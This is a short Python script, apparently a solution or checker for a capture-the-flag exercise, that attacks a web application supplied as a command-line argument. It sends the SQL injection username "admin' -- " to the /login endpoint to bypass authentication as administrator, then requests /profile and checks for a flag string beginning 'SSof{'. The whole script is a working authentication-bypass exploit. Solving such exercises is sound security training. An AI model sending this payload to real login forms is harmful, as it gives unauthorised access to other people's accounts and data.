import requests, sys, os, random

SERVER = sys.argv[1]

session = requests.session()

user = "admin' -- "
password = "any"

params = {'password' : password, 'username' : user}
r = session.post(SERVER + '/login', data=params)

assert 'admin' in r.text

params = {}
headers = {'user-agent': 'my-app/0.0.1', 'Content-Type': 'application/json'}
r = requests.get(SERVER + '/profile', params=params, headers=headers, cookies=session.cookies)

assert 'SSof{' in r.text